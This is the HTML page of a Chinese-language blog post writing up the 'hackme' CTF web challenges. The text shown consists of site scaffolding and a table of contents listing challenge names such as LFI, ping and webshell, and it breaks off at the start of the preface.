<!doctype html><html lang=zh-TW dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="zh-tw"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><title>CTF 「hackme」Web Write Up &#183; Alpaca's Notes</title>
<meta name=title content="CTF 「hackme」Web Write Up &#183; Alpaca's Notes"><meta name=description content="Just some notes."><meta name=keywords content="CTF,"><link rel=canonical href=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/><link type=text/css rel=stylesheet href=/css/main.bundle.min.9ae9893374537aff578c1e5f199c719ca0918123598c1ef028cf64b084e20a31acd81f2261e4f502e32c3e329d003bffbfbae8118007ecd6083da136d5b509fe.css integrity="sha512-mumJM3RTev9XjB5fGZxxnKCRgSNZjB7wKM9ksITiCjGs2B8iYeT1AuMsPjKdADv/v7roEYAH7NYIPaE21bUJ/g=="><script type=text/javascript src=/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.af87075fe43211bc3db73fce5f521e05e31ede2ee2635ec2223eed5d9ce04bf290d3fe07e669faa1efd00dae5ffb2a4abd9b0ceb91a606b4affe2879e118e2fb.js integrity="sha512-r4cHX+QyEbw9tz/OX1IeBeMe3i7iY17CIj7tXZzgS/KQ0/4H5mn6oe/QDa5f+ypKvZsM65GmBrSv/ih54Rji+w==" data-copy data-copied></script><script src=/js/zoom.min.js></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/"><meta property="og:site_name" content="Alpaca's Notes"><meta property="og:title" content="CTF 「hackme」Web Write Up"><meta property="og:description" content="Just some notes."><meta property="og:locale" content="zh_tw"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-11T10:53:47+00:00"><meta property="article:modified_time" content="2022-04-11T10:53:47+00:00"><meta property="article:tag" content="CTF"><meta property="og:image" content="https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/cover.gif"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/cover.gif"><meta name=twitter:title content="CTF 「hackme」Web Write Up"><meta name=twitter:description content="Just some notes."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"CTF 「hackme」Web Write Up","headline":"CTF 「hackme」Web Write Up","inLanguage":"zh-tw","url":"https:\/\/blog.alpaca.tw\/posts\/ctf-hackme-web-write-up\/","author":{"@type":"Person","name":"Alpaca"},"copyrightYear":"2022","dateCreated":"2022-04-11T10:53:47\u002b00:00","datePublished":"2022-04-11T10:53:47\u002b00:00","dateModified":"2022-04-11T10:53:47\u002b00:00","keywords":["ctf","hackme","write up"],"mainEntityOfPage":"true","wordCount":"17858"}]</script><meta name=author content="Alpaca"><link href=https://github.com/alpaca0x0 rel=me><link href=https://instagram.com/alpaca0x0 rel=me><script src=/lib/jquery/jquery.slim.min.js integrity></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-B7KMWZNLKP"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-B7KMWZNLKP")</script><meta name=theme-color><script src=https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js></script><script src=https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js></script><script src=https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js></script><script>const firebaseConfig={apiKey:"AIzaSyBDASL_wSsMmPWyUxa_NEqgtZTkqi8GT64",authDomain:"AIzaSyBDASL_wSsMmPWyUxa_NEqgtZTkqi8GT64",projectId:"blog-9f514",storageBucket:"blog-9f514.firebasestorage.app",messagingSenderId:"591882364818",appId:"1:591882364818:web:e80823a1a2f129d6bfc34b",measurementId:"G-RH3MVQSGPH"};var app=firebase.initializeApp(firebaseConfig),db=firebase.firestore(),auth=firebase.auth()</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8417118187182876" crossorigin=anonymous></script><link rel=preconnect href=//privacy-proxy.usercentrics.eu><link rel=preload href=//privacy-proxy.usercentrics.eu/latest/uc-block.bundle.js as=script><script type=application/javascript src=https://privacy-proxy.usercentrics.eu/latest/uc-block.bundle.js></script><script id=usercentrics-cmp src=https://web.cmp.usercentrics.eu/ui/loader.js data-settings-id=g1iR_obWcZHNaH async></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>快轉到主要內容</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 pl-[24px] pr-[24px]" style=z-index:100><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div style=padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3"><div><a href=/ class=flex><span class=sr-only>Alpaca&rsquo;s Notes</span>
<img src=/img/logo.png width=32 height=32 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Alpaca's Notes"></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">Alpaca&rsquo;s Notes</a></nav><nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12"><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Articles</p></a><a href=/series/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Series</p></a><a href=/categories/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Categories</p></a><a href=/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Tags</p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="ltr:mr-14 rtl:ml-14 flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center space-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title>
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400" style=margin-right:5px><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 -mr-2 md:hidden"><label id=menu-button for=menu-controller class=block><input type=checkbox id=menu-controller class=hidden><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper style=padding-top:5px class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Articles</p></a></li><li class=mt-1><a href=/series/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Series</p></a></li><li class=mt-1><a href=/categories/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Categories</p></a></li><li class=mt-1><a href=/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Tags</p></a></li></ul></div></label></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script>window.addEventListener("scroll",function(){var t=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,n=document.getElementById("menu-blur");n.style.opacity=t/300})</script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div class="w-full rounded-md h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style=background-image:url(/posts/ctf-hackme-web-write-up/cover_hud4656a056627ef82e9e975076ad5a227_97196_1200x0_resize_box_1.gif)></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom" style=background-image:url(/posts/ctf-hackme-web-write-up/cover_hud4656a056627ef82e9e975076ad5a227_97196_1200x0_resize_box_1.gif)><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-30 dark:opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script>window.addEventListener("scroll",function(){var t=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,n=document.getElementById("background-blur");n.style.opacity=t/300})</script><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">CTF 「hackme」Web Write Up</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-04-11 10:53:47 +0000 UTC">2022/04/11</time><span class="px-2 text-primary-500">&#183;</span><span>17858 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/CTF-hackme-web-Write-Up/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_posts/CTF-hackme-web-Write-Up/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<button id=button_likes class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400" onclick=process_article()>
<span id=button_likes_heart style=display:none class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
</span></span><span id=button_likes_emtpty_heart class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M244 84l11.1 12 12-11.98C300.6 51.37 347 36.51 392.6 44.1 461.5 55.58 512 115.2 512 185.1V190.9c0 41.5-17.2 81.2-47.6 109.5L283.7 469.1c-7.5 7-17.4 10.9-27.7 10.9S235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1.0 232.4.0 190.9V185.1c0-69.9 50.52-129.52 119.4-141 44.7-7.59 92 7.27 124.6 39.9C243.1 84 244 84.01 244 84zm11.1 79.9-45-46.8c-21.7-20.82-52.5-30.7-82.8-25.66C81.55 99.07 48 138.7 48 185.1V190.9c0 28.2 11.71 55.2 32.34 74.4L256 429.3l175.7-164c20.6-19.2 32.3-46.2 32.3-74.4V185.1c0-46.4-33.6-86.03-79.3-93.66C354.4 86.4 323.6 96.28 301.9 117.1l-46.8 46.8z"/></svg>
</span></span><span id=button_likes_text>&nbsp;Like</span></button></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/ctf/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">CTF</span></span></span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]"><details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">目錄</summary><div class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#link>Link</a></li><li><a href=#15-hide-and-seekhttpsctfhackmequest>15. <a href=https://ctf.hackme.quest/>hide and seek</a></a></li><li><a href=#16-guestbookhttpsctfhackmequestgb>16. <a href=https://ctf.hackme.quest/gb>guestbook</a></a></li><li><a href=#17-lfihttpsctfhackmequestlfi>17. <a href=https://ctf.hackme.quest/lfi/>LFI</a></a></li><li><a href=#18-homepagehttpsctfhackmequest>18. <a href=https://ctf.hackme.quest/>homepage</a></a></li><li><a href=#19-pinghttpsctfhackmequestping>19. <a href=https://ctf.hackme.quest/ping/>ping</a></a></li><li><a href=#20-scoreboardhttpsctfhackmequestscoreboard>20. <a href=https://ctf.hackme.quest/scoreboard>scoreboard</a></a></li><li><a href=#21-login-as-admin-0httpsctfhackmequestlogin0>21. <a href=https://ctf.hackme.quest/login0>login as admin 0</a></a></li><li><a href=#22-login-as-admin-01httpsctfhackmequestlogin0>22. <a href=https://ctf.hackme.quest/login0>login as admin 0.1</a></a></li><li><a href=#23-login-as-admin-1httpsctfhackmequestlogin1>23. <a href=https://ctf.hackme.quest/login1>login as admin 1</a></a></li><li><a href=#24-login-as-admin-12httpsctfhackmequestlogin1>24. <a href=https://ctf.hackme.quest/login1>login as admin 1.2</a></a></li><li><a href=#25-login-as-admin-3httpsctfhackmequestlogin3>25. <a href=https://ctf.hackme.quest/login3>login as admin 3</a></a></li><li><a href=#26-login-as-admin-4httpsctfhackmequestlogin4>26. <a href=https://ctf.hackme.quest/login4>login as admin 4</a></a></li><li><a href=#27-login-as-admin-6httpsctfhackmequestlogin6>27. <a href=https://ctf.hackme.quest/login6>login as admin 6</a></a></li><li><a href=#28-login-as-admin-7httpsctfhackmequestlogin7>28. <a href=https://ctf.hackme.quest/login7>login as admin 7</a></a></li><li><a href=#29-login-as-admin-8httpsctfhackmequestlogin8>29. <a href=https://ctf.hackme.quest/login8>login as admin 8</a></a></li><li><a href=#30-login-as-admin-81httpsctfhackmequestlogin8>30. <a href=https://ctf.hackme.quest/login8>login as admin 8.1</a></a></li><li><a href=#31-dafuq-manager-1httpsdafuq-managerhackmequest>31. <a href=https://dafuq-manager.hackme.quest/>dafuq-manager 1</a></a></li><li><a href=#32-dafuq-manager-2httpsdafuq-managerhackmequest>32. <a href=https://dafuq-manager.hackme.quest/>dafuq-manager 2</a></a></li><li><a href=#33-dafuq-manager-3httpsdafuq-managerhackmequest>33. <a href=https://dafuq-manager.hackme.quest/>dafuq-manager 3</a></a></li><li><a href=#34-wordpress-1httpswphackmequest>34. <a href=https://wp.hackme.quest/>wordpress 1</a></a></li><li><a href=#35-wordpress-2httpswphackmequest>35. <a href=https://wp.hackme.quest/>wordpress 2</a></a></li><li><a href=#36-webshellhttpswebshellhackmequest>36. <a href=https://webshell.hackme.quest/>webshell</a></a></li><li><a href=#37-command-executorhttpscommand-executorhackmequest>37. <a href=https://command-executor.hackme.quest/>command-executor</a></a></li><li><a href=#38-xssmehttpsxssrfhackmequest>38. <a href=https://xssrf.hackme.quest/>xssme</a></a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">目錄</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#link>Link</a></li><li><a href=#15-hide-and-seekhttpsctfhackmequest>15. <a href=https://ctf.hackme.quest/>hide and seek</a></a></li><li><a href=#16-guestbookhttpsctfhackmequestgb>16. <a href=https://ctf.hackme.quest/gb>guestbook</a></a></li><li><a href=#17-lfihttpsctfhackmequestlfi>17. <a href=https://ctf.hackme.quest/lfi/>LFI</a></a></li><li><a href=#18-homepagehttpsctfhackmequest>18. <a href=https://ctf.hackme.quest/>homepage</a></a></li><li><a href=#19-pinghttpsctfhackmequestping>19. <a href=https://ctf.hackme.quest/ping/>ping</a></a></li><li><a href=#20-scoreboardhttpsctfhackmequestscoreboard>20. <a href=https://ctf.hackme.quest/scoreboard>scoreboard</a></a></li><li><a href=#21-login-as-admin-0httpsctfhackmequestlogin0>21. <a href=https://ctf.hackme.quest/login0>login as admin 0</a></a></li><li><a href=#22-login-as-admin-01httpsctfhackmequestlogin0>22. <a href=https://ctf.hackme.quest/login0>login as admin 0.1</a></a></li><li><a href=#23-login-as-admin-1httpsctfhackmequestlogin1>23. <a href=https://ctf.hackme.quest/login1>login as admin 1</a></a></li><li><a href=#24-login-as-admin-12httpsctfhackmequestlogin1>24. <a href=https://ctf.hackme.quest/login1>login as admin 1.2</a></a></li><li><a href=#25-login-as-admin-3httpsctfhackmequestlogin3>25. <a href=https://ctf.hackme.quest/login3>login as admin 3</a></a></li><li><a href=#26-login-as-admin-4httpsctfhackmequestlogin4>26. <a href=https://ctf.hackme.quest/login4>login as admin 4</a></a></li><li><a href=#27-login-as-admin-6httpsctfhackmequestlogin6>27. <a href=https://ctf.hackme.quest/login6>login as admin 6</a></a></li><li><a href=#28-login-as-admin-7httpsctfhackmequestlogin7>28. <a href=https://ctf.hackme.quest/login7>login as admin 7</a></a></li><li><a href=#29-login-as-admin-8httpsctfhackmequestlogin8>29. <a href=https://ctf.hackme.quest/login8>login as admin 8</a></a></li><li><a href=#30-login-as-admin-81httpsctfhackmequestlogin8>30. <a href=https://ctf.hackme.quest/login8>login as admin 8.1</a></a></li><li><a href=#31-dafuq-manager-1httpsdafuq-managerhackmequest>31. <a href=https://dafuq-manager.hackme.quest/>dafuq-manager 1</a></a></li><li><a href=#32-dafuq-manager-2httpsdafuq-managerhackmequest>32. <a href=https://dafuq-manager.hackme.quest/>dafuq-manager 2</a></a></li><li><a href=#33-dafuq-manager-3httpsdafuq-managerhackmequest>33. <a href=https://dafuq-manager.hackme.quest/>dafuq-manager 3</a></a></li><li><a href=#34-wordpress-1httpswphackmequest>34. <a href=https://wp.hackme.quest/>wordpress 1</a></a></li><li><a href=#35-wordpress-2httpswphackmequest>35. <a href=https://wp.hackme.quest/>wordpress 2</a></a></li><li><a href=#36-webshellhttpswebshellhackmequest>36. <a href=https://webshell.hackme.quest/>webshell</a></a></li><li><a href=#37-command-executorhttpscommand-executorhackmequest>37. <a href=https://command-executor.hackme.quest/>command-executor</a></a></li><li><a href=#38-xssmehttpsxssrfhackmequest>38. <a href=https://xssrf.hackme.quest/>xssme</a></a></li></ul></nav></div></details><script>(function(){var t,e=$("#TableOfContents");if(e.length>0){t=$(window);function n(){var s,o=t.scrollTop(),i=$(".anchor"),n="";if(i.each(function(e,t){t=$(t),t.offset().top-$(window).height()/3<=o&&(n=decodeURIComponent(t.attr("id")))}),s=e.find("a.active"),s.length==1&&s.eq(0).attr("href")=="#"+n)return!0;s.each(function(e,t){$(t).removeClass("active")}),e.find('a[href="#'+n+'"]').addClass("active"),e.find('a[href="#'+n+'"]').parentsUntil("#TableOfContents").each(function(e,t){$(t).children("a").parents("ul").show()})}t.on("scroll",n),$(document).ready(function(){n()})}})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-max mb-20" style=word-wrap:break-word><hr><h2 class="relative group">前言<div id=%E5%89%8D%E8%A8%80 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%E5%89%8D%E8%A8%80 aria-label=定位點>#</a></span></h2><p>之前沒有打 